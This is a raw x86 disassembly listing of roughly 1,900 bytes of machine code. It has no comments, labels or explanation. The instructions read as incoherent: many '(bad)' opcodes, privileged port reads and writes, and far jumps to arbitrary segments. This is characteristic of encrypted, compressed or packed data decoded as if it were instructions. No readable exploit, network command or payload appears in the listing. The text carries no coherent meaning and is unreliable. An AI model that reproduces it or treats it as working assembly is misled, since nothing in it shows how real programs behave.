  407d3e:	and    eax,0xc146fa1b
  407d43:	int3   
  407d44:	push   esp
  407d45:	and    eax,DWORD PTR [eax+0x57]
  407d48:	mov    bl,0x76
  407d4a:	push   es
  407d4b:	xchg   esi,eax
  407d4c:	jmp    0x7ff2:0x7155e28e
  407d53:	and    BYTE PTR [eax-0x33],cl
  407d56:	push   esp
  407d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d58:	in     eax,dx
  407d59:	push   0xffffffc5
  407d5b:	in     al,0x11
  407d5d:	fs icebp 
  407d5f:	cmp    DWORD PTR [eax+esi*8+0x3e9b6c31],edx
  407d66:	jge    0x407d29
  407d68:	push   ebp
  407d69:	fild   DWORD PTR [ebp-0x1a]
  407d6c:	sti    
  407d6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d6e:	test   eax,0xb0b097f2
  407d73:	cld    
  407d74:	scas   al,BYTE PTR es:[edi]
  407d75:	pop    esi
  407d76:	outs   dx,BYTE PTR ds:[esi]
  407d77:	test   eax,0xcada3841
  407d7c:	pop    ecx
  407d7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d7e:	sbb    al,0x22
  407d80:	push   ebp
  407d81:	mov    cl,0x57
  407d83:	pop    esi
  407d84:	ret    
  407d85:	cs pop ds
  407d87:	test   cl,al
  407d89:	(bad)  
  407d8a:	rcl    BYTE PTR [edi+ebp*4],0xf
  407d8e:	(bad)  
  407d8f:	scas   al,BYTE PTR es:[edi]
  407d90:	xchg   ecx,eax
  407d91:	and    BYTE PTR [edi-0x7d67dfa],ch
  407d97:	xor    al,0x10
  407d99:	xchg   ebp,eax
  407d9a:	rcr    edi,0x1
  407d9d:	add    ebp,DWORD PTR [ecx]
  407d9f:	fisub  DWORD PTR [ebp-0x6e]
  407da2:	jno    0x407dc2
  407da4:	shl    cl,1
  407da6:	lds    esi,FWORD PTR [edx-0x4b]
  407da9:	loope  0x407e24
  407dab:	jecxz  0x407dfe
  407dad:	cli    
  407dae:	ror    BYTE PTR [edi],cl
  407db0:	sbb    eax,0xa6a5848
  407db5:	and    eax,0xf5de699e
  407dba:	or     DWORD PTR [ebx-0x53],esp
  407dbd:	xchg   bh,cl
  407dbf:	adc    bl,ah
  407dc1:	and    DWORD PTR [edx+esi*4-0x44],edx
  407dc5:	mov    WORD PTR [esi-0x1e9c39df],fs
  407dcb:	mov    ah,0x56
  407dcd:	jno    0x407e05
  407dcf:	mov    ecx,ebp
  407dd1:	test   bh,ch
  407dd3:	xor    DWORD PTR [esi+0x46],edi
  407dd6:	sub    dh,dh
  407dd8:	sub    edi,DWORD PTR [esi]
  407dda:	daa    
  407ddb:	ins    BYTE PTR es:[edi],dx
  407ddc:	jecxz  0x407e4f
  407dde:	(bad)  [eax+0x765ff0c9]
  407de4:	loopne 0x407d6c
  407de6:	repz idiv BYTE PTR [ecx]
  407de9:	add    DWORD PTR [esi+0x940c3ae],0xffffffa7
  407df0:	dec    ebp
  407df1:	sub    al,0x31
  407df3:	sar    dl,0xcc
  407df6:	mov    ah,0xc3
  407df8:	pop    ecx
  407df9:	jecxz  0x407df1
  407dfb:	xchg   BYTE PTR [ebx-0x16],dh
  407dfe:	inc    esi
  407dff:	or     eax,0xc26fc9b7
  407e04:	sub    DWORD PTR ds:0xa8dfff13,edx
  407e0a:	fcmovne st,st(3)
  407e0c:	adc    dh,BYTE PTR [ebp-0x71]
  407e0f:	hlt    
  407e10:	in     eax,0x6a
  407e12:	aam    0x47
  407e14:	in     eax,0x19
  407e16:	jl     0x407e75
  407e18:	sti    
  407e19:	push   eax
  407e1a:	push   0x2e
  407e1c:	jge    0x407e2c
  407e1e:	xchg   edi,eax
  407e1f:	mov    ebp,0xc95bf6a0
  407e24:	mov    bh,0x69
  407e26:	sahf   
  407e27:	dec    eax
  407e28:	std    
  407e29:	push   ecx
  407e2a:	mov    al,ds:0xa5173552
  407e2f:	enter  0xb156,0xb7
  407e33:	fmul   DWORD PTR [edx]
  407e35:	lods   eax,DWORD PTR ds:[esi]
  407e36:	xchg   BYTE PTR [ebp+0x1b],cl
  407e39:	sbb    al,0x67
  407e3b:	xor    edx,ebx
  407e3d:	aas    
  407e3e:	aas    
  407e3f:	mov    bl,0x99
  407e41:	mov    dl,0xc8
  407e43:	cs test eax,edi
  407e46:	lea    ecx,[ecx-0x22505bae]
  407e4c:	xchg   esp,eax
  407e4d:	(bad)  
  407e4e:	int3   
  407e4f:	iret   
  407e50:	inc    esi
  407e51:	ds int 0xf5
  407e54:	inc    ebx
  407e55:	mov    ecx,0x5fd86f8f
  407e5a:	jo     0x407e4a
  407e5c:	dec    ebp
  407e5d:	xor    ch,al
  407e5f:	mov    BYTE PTR [esi],bl
  407e61:	(bad)  
  407e62:	cmp    eax,0x1a657b53
  407e67:	nop
  407e68:	fstp   TBYTE PTR [eax-0x16]
  407e6b:	mov    bl,0x77
  407e6d:	push   cs
  407e6e:	in     al,0xf1
  407e70:	or     BYTE PTR [esi],0x58
  407e73:	iret   
  407e74:	jl     0x407ee1
  407e76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e77:	popa   
  407e78:	ss mov ebp,0x4d768e09
  407e7e:	push   0x72
  407e80:	dec    esp
  407e81:	pop    ds
  407e82:	xchg   edi,eax
  407e83:	je     0x407eeb
  407e85:	xchg   dh,ah
  407e87:	and    eax,0xf2846859
  407e8c:	test   BYTE PTR [edx+0x20],ch
  407e8f:	push   edi
  407e90:	and    ah,BYTE PTR [ecx-0x22]
  407e93:	std    
  407e94:	loopne 0x407e6b
  407e96:	inc    esi
  407e97:	push   esp
  407e98:	and    BYTE PTR [edx+edi*1],ch
  407e9b:	inc    eax
  407e9c:	ss jp  0x407e7f
  407e9f:	pop    ecx
  407ea0:	xor    DWORD PTR [esi],ebp
  407ea2:	xchg   edx,eax
  407ea3:	in     al,0x1c
  407ea5:	lahf   
  407ea6:	push   esi
  407ea7:	dec    ebx
  407ea8:	pop    esi
  407ea9:	call   FWORD PTR [ebx]
  407eab:	inc    ecx
  407eac:	idiv   BYTE PTR [ecx-0x5c]
  407eaf:	out    dx,eax
  407eb0:	arpl   WORD PTR [ecx-0x4062ac39],bx
  407eb6:	hlt    
  407eb7:	out    dx,al
  407eb8:	push   edi
  407eb9:	mov    edx,0x85e240d2
  407ebe:	arpl   WORD PTR [esi+esi*2+0x39],si
  407ec2:	jne    0x407e4f
  407ec4:	sub    ecx,DWORD PTR [ebp+0x17e531f6]
  407eca:	arpl   WORD PTR [ecx+0x56],cx
  407ecd:	out    dx,al
  407ece:	ret    
  407ecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ed0:	and    al,0x7d
  407ed2:	jmp    0xfeff:0x88d5152c
  407ed9:	push   ds
  407eda:	iret   
  407edb:	ss icebp 
  407edd:	sub    BYTE PTR [eax-0x3c0c5e2f],bl
  407ee3:	int3   
  407ee4:	add    al,0x51
  407ee6:	bound  edi,QWORD PTR [eax-0x5fde8d31]
  407eec:	xchg   esi,eax
  407eed:	adc    ebx,ecx
  407eef:	pop    eax
  407ef0:	call   0x1c8a:0x4a3b4766
  407ef7:	cmc    
  407ef8:	xchg   BYTE PTR [edi+esi*8-0x78],ah
  407efc:	push   0xe03278ff
  407f01:	loopne 0x407f09
  407f03:	aam    0x46
  407f05:	mov    ch,0xa8
  407f07:	inc    ebx
  407f08:	test   DWORD PTR [edx+0x5173265f],esi
  407f0e:	lods   eax,DWORD PTR ds:[esi]
  407f0f:	xchg   edx,eax
  407f10:	outs   dx,BYTE PTR ds:[esi]
  407f11:	fs cdq 
  407f13:	jmp    0xd4ca:0x29f9cc86
  407f1a:	fwait
  407f1b:	aaa    
  407f1c:	int    0x49
  407f1e:	add    DWORD PTR [ecx-0x6f],esp
  407f21:	mov    DWORD PTR [edx-0x56ca60a6],eax
  407f27:	into   
  407f28:	or     ah,BYTE PTR [ebp-0x5c]
  407f2b:	in     al,0x12
  407f2d:	push   0xe
  407f2f:	stc    
  407f30:	loop   0x407f55
  407f32:	aaa    
  407f33:	jle    0x407f52
  407f35:	add    DWORD PTR ss:[esi-0x228c8d62],eax
  407f3c:	cld    
  407f3d:	push   ebp
  407f3e:	sar    BYTE PTR [edi-0x653b9733],0x17
  407f45:	push   cs
  407f46:	imul   esp,edi,0x2e80f2c1
  407f4c:	(bad)  
  407f4d:	jmp    0x28a8:0x1bb5d0a1
  407f54:	xor    ah,BYTE PTR [edi-0x1b]
  407f57:	mov    ecx,0x9e538327
  407f5c:	in     eax,dx
  407f5d:	mov    eax,0x4c02aaac
  407f62:	lods   eax,DWORD PTR ds:[esi]
  407f63:	inc    ebp
  407f64:	or     BYTE PTR [esi+0x4a],cl
  407f67:	add    ecx,DWORD PTR [eax-0x3a]
  407f6a:	test   al,0x8
  407f6c:	sub    esi,DWORD PTR [ebp-0x3ac75ac9]
  407f72:	push   ebx
  407f73:	mov    WORD PTR ss:[ebx],ds
  407f76:	(bad)  
  407f77:	add    al,0x7a
  407f79:	test   DWORD PTR [eax-0x476ed3cd],edx
  407f7f:	xchg   esp,eax
  407f80:	jecxz  0x407f50
  407f82:	scas   al,BYTE PTR es:[edi]
  407f83:	push   edi
  407f84:	aad    0x38
  407f86:	fisubr WORD PTR [esi]
  407f88:	cmp    al,0x2
  407f8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f8b:	mov    ecx,0x54cdaef8
  407f90:	mov    bl,BYTE PTR [esi-0x66ac5632]
  407f96:	sti    
  407f97:	loope  0x407fd5
  407f99:	pop    ds
  407f9a:	aas    
  407f9b:	mov    dl,0x63
  407f9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f9e:	clc    
  407f9f:	std    
  407fa0:	push   eax
  407fa1:	ret    
  407fa2:	push   ds
  407fa3:	xlat   BYTE PTR ds:[ebx]
  407fa4:	outs   dx,BYTE PTR ds:[esi]
  407fa5:	push   ds
  407fa6:	xor    ecx,DWORD PTR [eax+eiz*4-0x66200ee3]
  407fad:	sbb    eax,0xe9935651
  407fb2:	pop    eax
  407fb3:	dec    edi
  407fb4:	pop    eax
  407fb5:	mov    edi,DWORD PTR [ecx-0x53b56669]
  407fbb:	aad    0x5d
  407fbd:	imul   edi,DWORD PTR [ecx-0x10],0xf5625af6
  407fc4:	sbb    DWORD PTR [ecx+eiz*8+0x65],ebp
  407fc8:	add    cl,ah
  407fca:	adc    edx,DWORD PTR ss:[edx]
  407fcd:	imul   ecx,DWORD PTR [edi],0x6c
  407fd0:	jecxz  0x408028
  407fd2:	inc    eax
  407fd3:	inc    esp
  407fd4:	neg    eax
  407fd6:	push   eax
  407fd7:	adc    dh,bl
  407fd9:	retf   
  407fda:	jmp    0x407fa6
  407fdc:	popf   
  407fdd:	jmp    0xdbf03672
  407fe2:	mov    esp,0xa7e6135f
  407fe7:	jno    0x408049
  407fe9:	fist   WORD PTR [ecx]
  407feb:	mov    ah,0x9a
  407fed:	mov    esi,0x21132267
  407ff2:	and    ebx,DWORD PTR [edx+0x3f4b3612]
  407ff8:	int    0xe0
  407ffa:	retf   0x37a8
  407ffd:	fisub  WORD PTR [ebx-0x77]
  408000:	int    0xa
  408002:	scas   eax,DWORD PTR es:[edi]
  408003:	cmp    al,0xe1
  408005:	adc    DWORD PTR [ecx],0x7b842ad
  40800b:	in     al,dx
  40800c:	sti    
  40800d:	cwde   
  40800e:	inc    ecx
  40800f:	cmp    bl,al
  408011:	adc    al,0x9f
  408013:	lea    eax,[esi-0x6fc4a60b]
  408019:	cmp    ebp,ebp
  40801b:	and    al,0xdd
  40801d:	inc    edi
  40801e:	pop    esi
  40801f:	cmp    al,0xd2
  408021:	dec    edx
  408022:	dec    ebp
  408023:	dec    esi
  408024:	mov    bl,0x1
  408026:	cwde   
  408027:	in     eax,0x4e
  408029:	aas    
  40802a:	ins    BYTE PTR es:[edi],dx
  40802b:	sbb    DWORD PTR ds:0x197a78af,0x9d8e270c
  408035:	xor    ebx,DWORD PTR [ebp+0x4c1a5d11]
  40803b:	xchg   esp,eax
  40803c:	xor    edi,DWORD PTR [edx]
  40803e:	repnz sbb al,cl
  408041:	pusha  
  408042:	jl     0x407ff5
  408044:	dec    edi
  408045:	mov    ds:0x14fb9495,al
  40804a:	retf   
  40804b:	push   ebp
  40804c:	dec    esp
  40804d:	jl     0x4080c5
  40804f:	dec    esi
  408050:	xchg   esp,eax
  408051:	daa    
  408052:	cmp    ebp,edi
  408054:	push   0x58cc9bd
  408059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40805a:	sbb    eax,0x150760d9
  40805f:	popf   
  408060:	mov    al,ch
  408062:	outs   dx,BYTE PTR ds:[esi]
  408063:	sub    BYTE PTR [esi+edi*8-0xb],dl
  408067:	mov    ds:0x5034a069,al
  40806c:	add    al,0x89
  40806e:	jne    0x408054
  408070:	add    ebp,DWORD PTR [eax-0x49c7c22f]
  408076:	mov    edx,0xf47f6813
  40807b:	fs jbe 0x40801a
  40807e:	mov    ds,WORD PTR [esi]
  408080:	out    dx,al
  408081:	dec    ecx
  408082:	ja     0x408041
  408084:	lods   al,BYTE PTR ds:[esi]
  408085:	jp     0x408014
  408087:	mov    esp,0xcdf97df2
  40808c:	scas   eax,DWORD PTR es:[edi]
  40808d:	ins    BYTE PTR es:[edi],dx
  40808e:	lock (bad) [ebx+0x10a96836]
  408095:	adc    ebp,DWORD PTR [eax-0x16595d56]
  40809b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40809c:	sbb    DWORD PTR [ebp-0x4b85b08d],esi
  4080a2:	dec    edi
  4080a3:	pop    ds
  4080a4:	hlt    
  4080a5:	stc    
  4080a6:	mov    edi,0xe642d03b
  4080ab:	ins    BYTE PTR es:[edi],dx
  4080ac:	cld    
  4080ad:	int    0x3a
  4080af:	mov    ebp,0x95142668
  4080b4:	call   0x5903:0xdd9592aa
  4080bb:	pop    ecx
  4080bc:	inc    ebx
  4080bd:	mov    dh,0xef
  4080bf:	loope  0x408135
  4080c1:	mov    DWORD PTR [eax],ecx
  4080c3:	mov    edi,0x9897fb37
  4080c8:	or     BYTE PTR [edi-0xb],cl
  4080cb:	call   0x150f87f0
  4080d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080d1:	mov    esi,0xb7e67a34
  4080d6:	pop    ecx
  4080d7:	iret   
  4080d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080d9:	fwait
  4080da:	(bad)  
  4080db:	adc    ebp,DWORD PTR [eax]
  4080dd:	gs sbb al,0xb7
  4080e0:	int    0xf
  4080e2:	rcr    BYTE PTR [ecx+0x53],0xb3
  4080e6:	in     al,0xd9
  4080e8:	fdivr  QWORD PTR [eax+eiz*2]
  4080eb:	cmp    DWORD PTR [edx+0x19c4f96],0xffffffc6
  4080f2:	cmp    BYTE PTR [ecx-0xff4b6ce],al
  4080f8:	jmp    DWORD PTR [ecx+0x42]
  4080fb:	pop    ebx
  4080fc:	add    esi,DWORD PTR [ebp+0x395b3b2f]
  408102:	enter  0x5ffd,0x49
  408106:	mov    esi,0xbbe13b43
  40810b:	and    bl,BYTE PTR [edi]
  40810d:	in     al,dx
  40810e:	data16 aas 
  408110:	js     0x408180
  408112:	sbb    eax,0x8b64003d
  408117:	jae    0x40812a
  408119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40811a:	pop    ss
  40811b:	cs push ebp
  40811d:	jmp    0x40819a
  40811f:	pop    es
  408120:	js     0x4081a1
  408122:	fdivrp st(0),st
  408124:	xchg   edx,eax
  408125:	add    al,0xbc
  408127:	mov    eax,ds:0xfb12d98d
  40812c:	sub    ebx,DWORD PTR [edi]
  40812e:	push   ebp
  40812f:	scas   eax,DWORD PTR es:[edi]
  408130:	outs   dx,BYTE PTR ds:[esi]
  408131:	sub    al,0x94
  408133:	sub    bh,dl
  408135:	mov    bl,0x38
  408137:	inc    esp
  408138:	jge    0x4081a3
  40813a:	shl    ecx,1
  40813c:	iret   
  40813d:	clc    
  40813e:	jb     0x408170
  408140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408141:	stc    
  408142:	adc    cl,BYTE PTR [esi-0x34d3de81]
  408148:	es bsr edi,edi
  40814c:	cmp    DWORD PTR [edi],ecx
  40814e:	push   ecx
  40814f:	inc    esp
  408150:	stos   BYTE PTR es:[edi],al
  408151:	aam    0x5a
  408153:	mov    esp,0x8050fe8
  408158:	jb     0x408105
  40815a:	cmp    ecx,esp
  40815c:	push   cs
  40815d:	xchg   ecx,eax
  40815e:	mov    bl,0xb7
  408160:	out    0x97,al
  408162:	sbb    al,0xd0
  408164:	jne    0x408154
  408166:	adc    al,0xac
  408168:	fnstsw WORD PTR [eax+0x2480164f]
  40816e:	out    0xcd,eax
  408170:	mov    ebx,0x3a078ed5
  408175:	js     0x408120
  408177:	cmp    al,0x96
  408179:	nop
  40817a:	xchg   ecx,eax
  40817b:	dec    eax
  40817c:	dec    ebp
  40817d:	rcr    BYTE PTR [esi+0x1e],0xae
  408181:	cmc    
  408182:	adc    ch,cl
  408184:	xchg   BYTE PTR [ecx-0x2082c4c0],dl
  40818a:	test   al,0x76
  40818c:	push   0xfffffff4
  40818e:	std    
  40818f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408190:	and    DWORD PTR [ebx-0x69598279],edx
  408196:	sub    BYTE PTR [edi],bh
  408198:	loope  0x4081dd
  40819a:	mov    eax,0xf5913db9
  40819f:	gs mov cl,0x39
  4081a2:	call   edi
  4081a4:	mov    bl,0xdd
  4081a6:	leave  
  4081a7:	and    DWORD PTR [ebp+0x7697ac91],edi
  4081ad:	sub    al,0xb9
  4081af:	(bad)  
  4081b0:	lods   al,BYTE PTR ss:[esi]
  4081b2:	retf   
  4081b3:	adc    BYTE PTR [ebp-0x33],bl
  4081b6:	dec    esp
  4081b7:	cmpxchg BYTE PTR [ebx-0xf],ah
  4081bb:	xchg   BYTE PTR [edx],ah
  4081bd:	xchg   ecx,eax
  4081be:	cs jp  0x408239
  4081c1:	aam    0xdf
  4081c3:	adc    esp,DWORD PTR [ebp+0x3b]
  4081c6:	out    dx,eax
  4081c7:	mov    ah,0xac
  4081c9:	xor    BYTE PTR [eax-0x1d],ah
  4081cc:	jno    0x4081dd
  4081ce:	sbb    ecx,DWORD PTR [ebp+0x36]
  4081d1:	mov    fs:0xabd62e8,eax
  4081d7:	loopne 0x40819a
  4081d9:	pop    eax
  4081da:	jbe    0x40821f
  4081dc:	fidiv  WORD PTR [ebp-0x5d]
  4081df:	arpl   WORD PTR [eax-0x53],di
  4081e2:	push   esi
  4081e3:	mov    eax,ds:0xa49cb9e
  4081e8:	pop    es
  4081e9:	cmp    eax,0x692cde76
  4081ee:	je     0x408240
  4081f0:	(bad)  
  4081f1:	scas   al,BYTE PTR es:[edi]
  4081f2:	ret    
  4081f3:	(bad)  
  4081f4:	fucom  st(7)
  4081f6:	inc    eax
  4081f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081f8:	imul   esp,DWORD PTR [esi],0x5b
  4081fb:	mov    eax,0x916019ce
  408200:	or     BYTE PTR [edi+0x42],ch
  408203:	(bad)  
  408204:	mul    esi
  408206:	pop    edx
  408207:	sahf   
  408208:	push   ss
  408209:	sub    al,BYTE PTR [esi-0x26]
  40820c:	aaa    
  40820d:	pushf  
  40820e:	and    eax,0x2b952aee
  408213:	cmp    al,cl
  408215:	test   BYTE PTR [ecx+0x58],cl
  408218:	or     esp,DWORD PTR [edx]
  40821a:	dec    ecx
  40821b:	push   ds
  40821c:	aam    0x8f
  40821e:	fcmovu st,st(1)
  408220:	in     eax,dx
  408221:	shl    ebp,1
  408223:	xchg   ebp,eax
  408224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408226:	jo     0x408292
  408228:	fld    QWORD PTR [esi+0x29]
  40822b:	add    eax,0xb276f9c
  408230:	in     eax,dx
  408231:	jo     0x40825a
  408233:	add    DWORD PTR [ecx+0x5d],ebp
  408236:	cli    
  408237:	and    DWORD PTR [edi+0x67],ecx
  40823a:	push   ebx
  40823b:	xor    DWORD PTR [esi-0x34],esp
  40823e:	lock jge 0x408260
  408241:	ja     0x4081e7
  408243:	dec    edi
  408244:	mov    DWORD PTR [ecx],ecx
  408246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408247:	lods   al,BYTE PTR cs:[esi]
  408249:	mov    ch,0x4b
  40824b:	push   eax
  40824c:	dec    ebx
  40824d:	lods   al,BYTE PTR ds:[esi]
  40824e:	loope  0x40825a
  408250:	jmp    0x408226
  408252:	pop    ebx
  408253:	call   0xaa8d:0x1d850db0
  40825a:	aam    0x8
  40825c:	sub    al,BYTE PTR [edx]
  40825e:	mov    DWORD PTR [ecx-0xe],ebp
  408261:	pop    es
  408262:	int    0xf4
  408264:	jecxz  0x40825d
  408266:	test   al,0xc
  408268:	xchg   esp,eax
  408269:	test   eax,0xe56aa69a
  40826e:	mov    bh,0xbf
  408270:	mov    esp,0x17ba1392
  408275:	and    edi,0xcc7dee2a
  40827b:	xchg   edi,eax
  40827c:	pushf  
  40827d:	(bad)  
  40827e:	enter  0xbd63,0x7e
  408282:	inc    ebp
  408283:	jne    0x408294
  408285:	not    BYTE PTR [ebp+ebx*2+0x2e8e57f1]
  40828c:	imul   ecx,DWORD PTR [ecx],0x3c711568
  408292:	pop    ss
  408293:	mov    ecx,0x9712b7fd
  408298:	jmp    0xa1d8:0x4941d882
  40829f:	dec    esp
  4082a0:	jae    0x40829c
  4082a2:	xchg   ebp,eax
  4082a3:	paddw  mm0,QWORD PTR [esi-0x68]
  4082a7:	cwde   
  4082a8:	jno    0x4082a9
  4082aa:	mov    ebx,0x4aa31323
  4082af:	fsub   DWORD PTR [eax+eax*8+0x79]
  4082b3:	inc    ebx
  4082b4:	adc    eax,0xe50f9e35
  4082b9:	loope  0x408323
  4082bb:	iret   
  4082bc:	mov    ah,0xdf
  4082be:	pop    ebx
  4082bf:	ror    esp,0x92
  4082c2:	shl    BYTE PTR [ebx+0x3a],1
  4082c5:	(bad)  
  4082c7:	ror    cl,1
  4082c9:	dec    ebx
  4082ca:	hlt    
  4082cb:	xor    edi,DWORD PTR [ebx-0x3e3f3c0d]
  4082d1:	or     bl,ah
  4082d3:	fcomp  QWORD PTR [ebx]
  4082d5:	xchg   ebx,eax
  4082d6:	stos   DWORD PTR es:[edi],eax
  4082d7:	dec    esp
  4082d8:	out    0x54,al
  4082da:	cmp    DWORD PTR [edi],esi
  4082dc:	inc    esi
  4082dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082de:	mov    dl,0x20
  4082e0:	out    0xa4,eax
  4082e2:	add    ecx,esp
  4082e4:	data16 mov cl,0x84
  4082e7:	dec    esp
  4082e8:	stc    
  4082e9:	outs   dx,BYTE PTR ds:[esi]
  4082ea:	dec    eax
  4082eb:	jl     0x4082a6
  4082ed:	fcmovbe st,st(1)
  4082ef:	js     0x408351
  4082f1:	repnz pushf 
  4082f3:	mov    dh,BYTE PTR [ecx-0x5e611320]
  4082f9:	gs mov eax,0xba34d176
  4082ff:	fst    QWORD PTR [ebp-0x52701fc7]
  408305:	jae    0x4082a4
  408307:	inc    ebx
  408308:	xor    cl,BYTE PTR [ebp+0x18]
  40830b:	jns    0x4082f6
  40830d:	aam    0x83
  40830f:	fwait
  408310:	and    BYTE PTR [edi+0x1e],ch
  408313:	(bad)  
  408314:	jmp    0xe3ba:0xa7ded776
  40831b:	test   eax,0x2782c292
  408320:	div    DWORD PTR [ebp-0x30fb0c81]
  408326:	lods   al,BYTE PTR ds:[esi]
  408327:	js     0x4083a6
  408329:	out    dx,al
  40832a:	and    BYTE PTR [ecx],ch
  40832c:	sbb    bh,BYTE PTR [ebp+0x7a]
  40832f:	icebp  
  408330:	bound  esi,QWORD PTR [esi-0x45]
  408333:	push   edi
  408334:	shl    DWORD PTR [ecx+0x2e],0x1c
  408338:	xchg   edi,eax
  408339:	add    edi,DWORD PTR [edi+0x5f4ccd91]
  40833f:	loopne 0x408378
  408341:	xchg   ecx,eax
  408342:	jno    0x408326
  408344:	lock push eax
  408346:	mov    bh,0x69
  408348:	sbb    BYTE PTR [ecx],bh
  40834a:	cli    
  40834b:	inc    ebx
  40834c:	(bad)  [edi+eiz*4]
  40834f:	rol    DWORD PTR [ecx-0x77],1
  408352:	pop    esi
  408353:	sbb    edi,ebx
  408355:	lahf   
  408356:	add    edi,esp
  408358:	cli    
  408359:	sub    ah,BYTE PTR [eax]
  40835b:	cs mov ebp,0x76cea568
  408361:	ds inc ebp
  408363:	add    BYTE PTR [ebp+0x4ace4626],cl
  408369:	push   ebp
  40836a:	sbb    bh,BYTE PTR [ebx+0x73cb33d3]
  408370:	sbb    al,0x85
  408372:	xchg   esi,eax
  408373:	sahf   
  408374:	push   edx
  408375:	jmp    0x40831d
  408377:	adc    BYTE PTR [edx],ah
  408379:	popf   
  40837a:	inc    esi
  40837b:	cmp    al,BYTE PTR [edx]
  40837d:	and    eax,0x51ae6619
  408382:	jns    0x408361
  408384:	dec    eax
  408385:	je     0x408348
  408387:	sub    BYTE PTR [edx],0x77
  40838a:	loopne 0x408362
  40838c:	push   es
  40838d:	and    dh,BYTE PTR [edx]
  40838f:	adc    ebp,DWORD PTR [ebx+0x1c]
  408392:	lods   al,BYTE PTR ds:[esi]
  408393:	cmp    ebp,DWORD PTR [esi-0x1d9f999e]
  408399:	mov    ebp,0x89517a89
  40839e:	in     al,dx
  40839f:	dec    DWORD PTR [ecx]
  4083a1:	mov    ch,0x75
  4083a3:	or     DWORD PTR [ebx-0x42774df5],esp
  4083a9:	cmp    DWORD PTR [ecx-0x74],0x1c18b896
  4083b0:	sbb    dl,BYTE PTR fs:[esi]
  4083b3:	sti    
  4083b4:	lahf   
  4083b5:	inc    ecx
  4083b6:	push   esi
  4083b7:	pop    ecx
  4083b8:	jmp    0x1e94:0x828458d5
  4083bf:	dec    esi
  4083c0:	dec    esi
  4083c1:	addr16 dec ebp
  4083c3:	adc    edx,edx
  4083c5:	cs cmc 
  4083c7:	mov    eax,ds:0x4a315f9f
  4083cc:	sub    ecx,esi
  4083ce:	cdq    
  4083cf:	ins    WORD PTR es:[edi],dx
  4083d1:	sub    ebp,edi
  4083d3:	inc    esi
  4083d4:	or     ch,BYTE PTR [ebx-0x78]
  4083d7:	jns    0x4083fe
  4083d9:	jbe    0x408367
  4083db:	repnz pop edx
  4083dd:	or     edx,DWORD PTR [edi-0x72381a1d]
  4083e3:	js     0x40839a
  4083e5:	xchg   BYTE PTR [eax+0x74],dl
  4083e8:	sar    DWORD PTR [ecx+0x33],cl
  4083eb:	retf   0xc391
  4083ee:	mov    bh,0x46
  4083f0:	add    al,0x7f
  4083f2:	frstor [ebp+0x70]
  4083f5:	or     esi,edx
  4083f7:	mov    ch,0xfc
  4083f9:	(bad)  
  4083fa:	and    eax,0x89866c35
  4083ff:	pop    esi
  408400:	mov    ?,WORD PTR [eax-0x727c6503]
  408406:	lock ss adc al,0x31
  40840a:	mov    esi,0xb42dc57a
  40840f:	push   ds
  408410:	dec    edi
  408411:	icebp  
  408412:	adc    ah,0xfc
  408415:	dec    ebp
  408416:	scas   eax,DWORD PTR es:[edi]
  408417:	and    BYTE PTR [esi-0x197718ca],al
  40841d:	or     al,0x37
  40841f:	dec    BYTE PTR [ebp+0xbf05879]
  408425:	mov    bh,0x4b
  408427:	daa    
  408428:	cmp    eax,0x59ac5d4a
  40842d:	lea    edx,ss:[edx-0x34]
  408431:	push   edi
  408432:	or     DWORD PTR [ebx+edx*1+0x6e],eax
  408436:	test   eax,0xedb01e17
  40843b:	(bad)  
  40843d:	mov    ebp,DWORD PTR [edi+ebp*2]
  408440:	adc    al,0x21
  408442:	inc    edx
  408443:	(bad)  
  408444:	sub    edx,DWORD PTR [edx]
  408446:	mov    dl,0xb5
  408448:	inc    edx
  408449:	inc    edi
  40844a:	sub    cl,dl
  40844c:	loop   0x4084af
  40844e:	jg     0x4083d6
  408450:	dec    eax
  408451:	jns    0x40844e
  408453:	stos   DWORD PTR es:[edi],eax
  408454:	mov    eax,ds:0x90b94ac7
  408459:	xchg   ecx,eax
  40845a:	mov    cl,0x87
  40845c:	and    BYTE PTR [edi],dl
  40845e:	mov    esi,0x88623d69
  408463:	push   ds
  408464:	pop    esi
  408465:	int3   
  408466:	stc    
  408467:	jns    0x4084bc
  408469:	xchg   esi,eax
  40846a:	stc    
  40846b:	jl     0x4084d2
  40846d:	fnstcw WORD PTR [esi]
  40846f:	(bad)  
  408470:	std    
  408471:	scas   eax,DWORD PTR es:[edi]
  408472:	cmp    DWORD PTR [ecx-0x42],ebp
  408475:	(bad)  
  408476:	lock push ecx
  408478:	cli    
  408479:	in     eax,dx
  40847a:	sahf   
  40847b:	test   DWORD PTR [eax+ecx*4],ebx
  40847e:	and    cl,BYTE PTR [ebx]
  408480:	push   0x4f1265a0
  408485:	xchg   ecx,eax
  408486:	hlt    
  408487:	int3   
  408488:	pop    ebx
  408489:	sbb    ebx,ecx
  40848b:	fsub   DWORD PTR [ecx+0x7f]
  40848e:	mov    esp,0xe2915bd1
  408493:	(bad)  
  408495:	shl    BYTE PTR [ecx+0x13],0x2e
  408499:	jl     0x40849c
  40849b:	sbb    BYTE PTR [ebp+0x71ee3c8c],ch
  4084a1:	adc    dh,BYTE PTR [ecx]
  4084a3:	mov    esp,0x32d25c32
  4084a8:	retf   0xa08b
  4084ab:	mov    WORD PTR [edx+0x45c63489],es
  4084b1:	xor    bh,BYTE PTR [ebp+0x30]
